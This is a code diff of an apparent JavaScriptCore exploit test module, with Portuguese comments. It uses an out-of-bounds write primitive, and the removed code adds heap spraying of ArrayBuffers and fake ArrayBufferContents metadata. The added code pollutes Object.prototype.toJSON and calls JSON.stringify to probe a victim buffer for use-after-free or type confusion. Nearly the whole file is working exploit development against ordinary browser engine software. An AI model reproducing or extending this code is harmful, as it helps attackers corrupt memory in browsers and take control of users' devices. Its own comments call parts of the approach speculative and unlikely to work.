@@ -1,11 +1,10 @@
 // js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
-// Manteremos a estrutura do teste anterior, mas a lógica do getter será alterada
-// para a "Tentativa Agressiva de Corromper ArrayBuffer Pulverizado"
+// Renomeado internamente para refletir o novo foco
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_array_buffer_real,
+    oob_array_buffer_real, // Usado para a escrita OOB gatilho
     oob_dataview_real,
     oob_write_absolute,
     oob_read_absolute,
@@ -13,181 +12,147 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForAggroCorrupt";
-let getter_called_flag = false;
-let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };
+let test_results_for_json_uaf = { success: false, message: "Teste não iniciado.", details: "" };
 
-const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
-const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
+const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70 no oob_array_buffer_real
+const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Valor que aciona o getter
 
-// Metadados sombra que queremos que um AB vítima use
-const SHADOW_CONTENTS_DATA_PTR = new AdvancedInt64(0x1, 0x0); // Para causar crash se lido
-const SHADOW_CONTENTS_SIZE = new AdvancedInt64(0x7FFFFFF0, 0x0); // Tamanho gigante
-// Offset DENTRO do oob_array_buffer_real onde plantaremos os metadados sombra
-// Este valor (OFFSET_SHADOW_CONTENTS_IN_OOB_AB) é o que tentaremos escrever
-// no campo m_impl (CONTENTS_IMPL_POINTER_OFFSET) de um ArrayBuffer vítima.
-const OFFSET_SHADOW_CONTENTS_IN_OOB_AB = 0x200; // Ex: 512 bytes
+const VICTIM_AB_SIZE = 64; // Tamanho do ArrayBuffer vítima para o teste JSON UAF
 
-class CheckpointForAggroCorrupt {
-    constructor(id) {
-        this.id_marker = `AggroCorruptCheckpoint-${id}`;
-    }
+// Função de sondagem para Object.prototype.toJSON
+function probeVictimAB_toJSON() {
+    const FNAME_toJSON = "probeVictimAB_toJSON";
+    let details = [];
+    details.push(`toJSON CALLED! this: ${Object.prototype.toString.call(this)}`);
 
-    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
-        getter_called_flag = true;
-        const FNAME_GETTER = "AggroCorrupt_Getter";
-        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Tentando corrupção agressiva de AB pulverizado...`, "vuln", FNAME_GETTER);
-        current_test_results = { success: false, message: "Getter chamado.", error: null, details: "" };
-
-        let details_log = [];
-        let sprayed_victim_abs = [];
-        const spray_count = 50; 
-        const sprayed_ab_size = 64;
-
+    if (this instanceof ArrayBuffer) {
+        details.push("this IS ArrayBuffer.");
         try {
-            if (!oob_array_buffer_real || !oob_write_absolute || !JSC_OFFSETS.ArrayBuffer || !JSC_OFFSETS.ArrayBufferContents) {
-                throw new Error("Primitivas OOB, oob_array_buffer_real ou Offsets não disponíveis.");
-            }
-
-            // 1. Plantar os metadados sombra (ArrayBufferContents falsos) dentro do oob_array_buffer_real
-            // Estes são os metadados que queremos que um AB vítima use.
-            oob_write_absolute(OFFSET_SHADOW_CONTENTS_IN_OOB_AB + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SHADOW_CONTENTS_SIZE, 8);
-            oob_write_absolute(OFFSET_SHADOW_CONTENTS_IN_OOB_AB + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, SHADOW_CONTENTS_DATA_PTR, 8);
-            details_log.push(`Metadados sombra (ptr=${SHADOW_CONTENTS_DATA_PTR.toString(true)}, size=${SHADOW_CONTENTS_SIZE.toString(true)}) plantados em oob_data[${toHex(OFFSET_SHADOW_CONTENTS_IN_OOB_AB)}]`);
-
-            // 2. Spray de ArrayBuffers vítimas
-            logS3("DENTRO DO GETTER: Pulverizando ArrayBuffers vítimas...", "info", FNAME_GETTER);
-            for (let i = 0; i < spray_count; i++) {
-                try {
-                    sprayed_victim_abs.push(new ArrayBuffer(sprayed_ab_size));
-                } catch (e_alloc) { details_log.push(`Erro ao alocar sprayed_victim_abs[${i}]`); }
-            }
-            details_log.push(`Spray de ${sprayed_victim_abs.length} ArrayBuffers (tamanho ${sprayed_ab_size}) concluído.`);
-            if (sprayed_victim_abs.length === 0) throw new Error("Nenhum ArrayBuffer pulverizado.");
-
-            // 3. Tentar Corromper o CONTENTS_IMPL_POINTER de um dos ArrayBuffers pulverizados
-            //    Esta é a parte altamente especulativa. Onde está o objeto JS sprayed_victim_abs[X] e seu campo m_impl?
-            //    Vamos tentar escrever o *offset* dos nossos metadados sombra (OFFSET_SHADOW_CONTENTS_IN_OOB_AB)
-            //    em vários locais especulativos *dentro do oob_array_buffer_real*, na esperança de que um desses locais
-            //    seja, por acaso, o campo m_impl de um dos sprayed_victim_abs.
-            //    Isso só funcionaria se sprayed_victim_abs[X] (o objeto JS) fosse alocado DENTRO do oob_array_buffer_real
-            //    ou se oob_write_absolute pudesse escrever fora de oob_array_buffer_real (o que não é o caso).
-            //    A escrita OOB em 0x70 é a única que sabemos ter um efeito "externo" (chamar o getter).
-            //    Este teste, como escrito aqui, tem baixa probabilidade de sucesso para corromper um sprayed_ab externo.
-            
-            //    Vamos manter a lógica anterior do teste de "corrupção agressiva" que você executou,
-            //    onde escrevemos um valor (que representa o offset dos metadados sombra)
-            //    em um offset fixo dentro do oob_array_buffer_real.
-            const speculative_victim_impl_ptr_location_in_oob = CORRUPTION_OFFSET_TRIGGER + 0x80; // Ex: 0xF0
-            // O VALOR a ser escrito é o "ponteiro" para os nossos metadados sombra.
-            // Se o m_impl espera um ponteiro absoluto, precisaríamos de addrof(oob_data_start + OFFSET_SHADOW_CONTENTS_IN_OOB_AB).
-            // Como não temos, escrever o offset relativo (0x200) é apenas um placeholder para este teste.
-            // Para que isso funcione, o JSC precisaria tratar este valor numérico como um ponteiro relativo ao início de alguma "data cage".
-            const value_to_write_as_impl_ptr_offset = new AdvancedInt64(OFFSET_SHADOW_CONTENTS_IN_OOB_AB, 0); 
-
-            if (speculative_victim_impl_ptr_location_in_oob + 8 <= oob_array_buffer_real.byteLength) {
-                logS3(`DENTRO DO GETTER: Escrita Especulativa: oob_write_absolute(${toHex(speculative_victim_impl_ptr_location_in_oob)}, ${value_to_write_as_impl_ptr_offset.toString(true)}, 8)`, "info", FNAME_GETTER);
-                oob_write_absolute(speculative_victim_impl_ptr_location_in_oob, value_to_write_as_impl_ptr_offset, 8);
-                details_log.push(`Escrita especulativa em oob_data[${toHex(speculative_victim_impl_ptr_location_in_oob)}] com valor ${value_to_write_as_impl_ptr_offset.toString(true)} (suposto ponteiro para metadados sombra).`);
-            } else {
-                details_log.push(`Offset de escrita especulativa ${toHex(speculative_victim_impl_ptr_location_in_oob)} fora do oob_array_buffer.`);
+            details.push(`this.byteLength: ${this.byteLength} (Esperado: ${VICTIM_AB_SIZE} ou corrompido)`);
+            if (this.byteLength !== VICTIM_AB_SIZE && this.byteLength !== 0) { // 0 pode ser se foi detached
+                logS3("toJSON_PROBE: CORRUPÇÃO DE BYTELENGTH! " + details.join('; '), "vuln", FNAME_toJSON);
+                test_results_for_json_uaf.success = true;
+                test_results_for_json_uaf.message = "Corrupção de byteLength do ArrayBuffer vítima detectada em toJSON!";
             }
             
-            // 4. Verificar os ArrayBuffers pulverizados
-            let corruption_successful = false;
-            for (let i = 0; i < sprayed_victim_abs.length; i++) {
-                const victim = sprayed_victim_abs[i];
-                if (!victim) continue;
-                let current_victim_len = -1;
-                try {
-                    current_victim_len = victim.byteLength;
-                    details_log.push(`Verificando sprayed_victim_abs[${i}].byteLength: ${current_victim_len}`);
-                    if (current_victim_len === SHADOW_CONTENTS_SIZE.low()) {
-                        logS3(`DENTRO DO GETTER: SUCESSO! sprayed_victim_abs[${i}].byteLength (${current_victim_len}) CORRESPONDE ao tamanho sombra!`, "vuln", FNAME_GETTER);
-                        const dv = new DataView(victim);
-                        dv.getUint32(0, true); // Tenta ler de SHADOW_CONTENTS_DATA_PTR (0x1) - ESPERA-SE CRASH/ERRO
-                        // Se não crashar, o data_ptr não foi re-tipado corretamente, mas o size sim.
-                        current_test_results = { success: true, message: `sprayed_victim_abs[${i}] RE-TIPADO (size OK)! Leitura de ${SHADOW_CONTENTS_DATA_PTR.toString(true)} NÃO CRASHOU.`, error: null, details: details_log.join('; ') };
-                        corruption_successful = true;
-                        break; 
-                    }
-                } catch (e_check) {
-                    details_log.push(`Erro/Crash ao usar sprayed_victim_abs[${i}] (len antes do erro: ${current_victim_len}): ${e_check.message}`);
-                    logS3(`DENTRO DO GETTER: Erro/Crash com sprayed_victim_abs[${i}]: ${e_check.message}`, "error", FNAME_GETTER);
-                    // Se o erro ocorreu APÓS a confirmação do tamanho, é o crash esperado
-                    if (current_victim_len === SHADOW_CONTENTS_SIZE.low() &&
-                        (String(e_check.message).toLowerCase().includes("rangeerror") || String(e_check.message).toLowerCase().includes("memory access"))) {
-                        current_test_results = { success: true, message: `sprayed_victim_abs[${i}] RE-TIPADO (size OK) e CRASH CONTROLADO ('${e_check.message}') ao ler de ${SHADOW_CONTENTS_DATA_PTR.toString(true)}!`, error: String(e_check), details: details_log.join('; ') };
-                        corruption_successful = true;
-                        logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "vuln", FNAME_GETTER);
-                        break;
-                    }
-                }
+            // Tentar usar o AB
+            let dv = new DataView(this);
+            details.push(`DataView criada sobre this. dv.byteLength: ${dv.byteLength}`);
+            if (dv.byteLength > 0) {
+                let val = dv.getUint32(0, true); // Tenta ler
+                details.push(`Leitura de this[0] (u32) via DataView: ${toHex(val)}`);
             }
-
-            if (!corruption_successful) {
-                current_test_results.message = "Nenhuma corrupção bem-sucedida nos ArrayBuffers pulverizados para usar metadados sombra através da escrita especulativa.";
-            }
-            current_test_results.details = details_log.join('; ');
-
         } catch (e) {
-            logS3(`DENTRO DO GETTER: ERRO GERAL: ${e.message}`, "error", FNAME_GETTER);
-            current_test_results.error = String(e);
-            current_test_results.message = `Erro geral no getter: ${e.message}`;
-        }
-        return 0xBADF00D;
-    }
-
-    toJSON() {
-        const FNAME_toJSON = "CheckpointForAggroCorrupt.toJSON";
-        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
-        // eslint-disable-next-line no-unused-vars
-        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
-        return { id: this.id_marker, processed_by_aggro_corrupt_test: true };
-    }
-}
-
-export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
-    const FNAME_TEST = "executeAggressiveCorruptSprayTest"; // Nome interno
-    logS3(`--- Iniciando Teste Agressivo de Corrupção de AB Pulverizado no Getter ---`, "test", FNAME_TEST);
-
-    getter_called_flag = false;
-    current_test_results = { success: false, message: "Teste não executado.", error: null, details: "" };
-
-    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }
-
-    try {
-        await triggerOOB_primitive();
-        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
-        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);
-
-        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
-        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} do oob_data completada.`, "info", FNAME_TEST);
-
-        const checkpoint_obj = new CheckpointForAggroCorrupt(1);
-        logS3(`CheckpointForAggroCorrupt objeto criado. ID: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST);
-        
-        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
-        try {
-            JSON.stringify(checkpoint_obj);
-        } catch (e) { /* ... */ }
-
-    } catch (mainError) { /* ... */ }
-    finally { /* ... */ }
-
-    if (getter_called_flag) {
-        if (current_test_results.success) {
-            logS3(`RESULTADO TESTE AGRESSIVO: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST);
-        } else {
-            logS3(`RESULTADO TESTE AGRESSIVO: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
-        }
-        if (current_test_results.details) {
-             logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST);
+            details.push(`Erro ao usar 'this' (ArrayBuffer) em toJSON: ${e.message}`);
+            logS3("toJSON_PROBE: ERRO ao usar 'this' como ArrayBuffer: " + e.message, "error", FNAME_toJSON);
+            // Um erro aqui pode ser um UAF ou type confusion grave
+            test_results_for_json_uaf.success = true;
+            test_results_for_json_uaf.message = `Erro (${e.message}) ao usar ArrayBuffer vítima em toJSON! (Possível UAF/Type Confusion)`;
         }
     } else {
-        logS3("RESULTADO TESTE AGRESSIVO: Getter NÃO foi chamado.", "error", FNAME_TEST);
+        details.push("this NÃO é ArrayBuffer! TYPE CONFUSION!");
+        logS3("toJSON_PROBE: TYPE CONFUSION! 'this' não é ArrayBuffer!", "vuln", FNAME_toJSON);
+        test_results_for_json_uaf.success = true;
+        test_results_for_json_uaf.message = "Type Confusion detectada! 'this' em toJSON não é ArrayBuffer.";
+    }
+    test_results_for_json_uaf.details = details.join('; ');
+    return { "processed_by_probe": true, "type": Object.prototype.toString.call(this) };
+}
+
+
+export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
+    const FNAME_TEST = "executeJsonUAF_with_0x70_Trigger";
+    logS3(`--- Iniciando Teste JSON UAF com Gatilho OOB em 0x70 ---`, "test", FNAME_TEST);
+
+    test_results_for_json_uaf = { success: false, message: "Teste não executado.", details: "" };
+
+    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }
+
+    let originalToJSONDescriptor = null;
+    let pollutionApplied = false;
+
+    try {
+        await triggerOOB_primitive(); // Configura oob_array_buffer_real
+        if (!oob_array_buffer_real) {
+            test_results_for_json_uaf.message = "Falha ao inicializar OOB.";
+            logS3(test_results_for_json_uaf.message, "critical", FNAME_TEST);
+            return;
+        }
+        logS3(`Ambiente OOB inicializado.`, "info", FNAME_TEST);
+
+        // 1. Poluir Object.prototype.toJSON
+        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
+        Object.defineProperty(Object.prototype, 'toJSON', {
+            value: probeVictimAB_toJSON,
+            writable: true, enumerable: false, configurable: true
+        });
+        pollutionApplied = true;
+        logS3("Object.prototype.toJSON poluído com a função de sondagem.", "info", FNAME_TEST);
+
+        // 2. Criar o ArrayBuffer vítima
+        let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
+        // Opcional: Preencher com um padrão para verificar se o conteúdo muda
+        try {
+            new DataView(victim_ab).setUint32(0, 0xDEADBEEF, true);
+            new DataView(victim_ab).setUint32(4, 0xCAFEBABE, true);
+        } catch(e) { logS3("Erro ao preencher victim_ab", "warn", FNAME_TEST); }
+        logS3(`ArrayBuffer vítima (tamanho ${VICTIM_AB_SIZE}) criado. Conteúdo inicial[0]: ${toHex(new DataView(victim_ab).getUint32(0,true))}`, "info", FNAME_TEST);
+
+
+        // 3. Realizar a escrita OOB "gatilho" no oob_array_buffer_real (objeto diferente do victim_ab)
+        logS3(`Realizando escrita OOB gatilho em oob_data[${toHex(CORRUPTION_OFFSET_TRIGGER)}]...`, "info", FNAME_TEST);
+        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
+        logS3(`Escrita OOB gatilho completada.`, "info", FNAME_TEST);
+        
+        // Pequena pausa para garantir que quaisquer efeitos da escrita OOB se propaguem
+        await PAUSE_S3(100);
+
+        // 4. Chamar JSON.stringify no ArrayBuffer vítima
+        logS3(`Chamando JSON.stringify(victim_ab)...`, "info", FNAME_TEST);
+        let stringify_result_str = "N/A";
+        try {
+            stringify_result_str = JSON.stringify(victim_ab);
+            logS3(`JSON.stringify(victim_ab) completado. Resultado string: ${stringify_result_str}`, "info", FNAME_TEST);
+            // Se chegarmos aqui sem test_results_for_json_uaf.success = true, e a toJSON foi chamada,
+            // significa que a toJSON não detectou corrupção óbvia.
+            if (pollutionApplied && !test_results_for_json_uaf.success && test_results_for_json_uaf.details.includes("toJSON CALLED")) {
+                 test_results_for_json_uaf.message = "toJSON foi chamada no victim_ab, mas nenhuma corrupção/erro óbvio detectado nela.";
+            } else if (!pollutionApplied && !test_results_for_json_uaf.details.includes("toJSON CALLED")) {
+                test_results_for_json_uaf.message = "JSON.stringify completado, mas a toJSON poluída não parece ter sido chamada.";
+            }
+
+        } catch (e) {
+            logS3(`Erro CRÍTICO durante JSON.stringify(victim_ab): ${e.message}`, "error", FNAME_TEST);
+            // Este erro é fora da toJSON, pode ser grave
+            test_results_for_json_uaf.success = true; // Um erro aqui é um sucesso especulativo
+            test_results_for_json_uaf.message = `Erro CRÍTICO em JSON.stringify(victim_ab): ${e.message}`;
+            test_results_for_json_uaf.error = String(e);
+        }
+
+    } catch (mainError) {
+        logS3(`Erro principal no teste: ${mainError.message}`, "critical", FNAME_TEST);
+        console.error(mainError);
+        test_results_for_json_uaf.success = false; // Indica falha no setup do teste
+        test_results_for_json_uaf.message = `Erro crítico no fluxo do teste: ${mainError.message}`;
+        test_results_for_json_uaf.error = String(mainError);
+    } finally {
+        // Restaurar Object.prototype.toJSON
+        if (pollutionApplied) {
+            if (originalToJSONDescriptor) {
+                Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptor);
+            } else {
+                delete Object.prototype.toJSON;
+            }
+            logS3("Object.prototype.toJSON restaurado.", "info", "CleanupFinal");
+        }
+        clearOOBEnvironment();
     }
 
-    clearOOBEnvironment();
-    logS3(`--- Teste Agressivo de Corrupção de AB Pulverizado Concluído ---`, "test", FNAME_TEST);
+    if (test_results_for_json_uaf.success) {
+        logS3(`RESULTADO TESTE JSON UAF (com gatilho 0x70): SUCESSO ESPECULATIVO! ${test_results_for_json_uaf.message}`, "vuln", FNAME_TEST);
+    } else {
+        logS3(`RESULTADO TESTE JSON UAF (com gatilho 0x70): Sem sucesso óbvio. ${test_results_for_json_uaf.message}`, "warn", FNAME_TEST);
+    }
+    logS3(`  Detalhes da sondagem toJSON: ${test_results_for_json_uaf.details}`, "info", FNAME_TEST);
+    logS3(`--- Teste JSON UAF com Gatilho OOB em 0x70 Concluído ---`, "test", FNAME_TEST);
 }
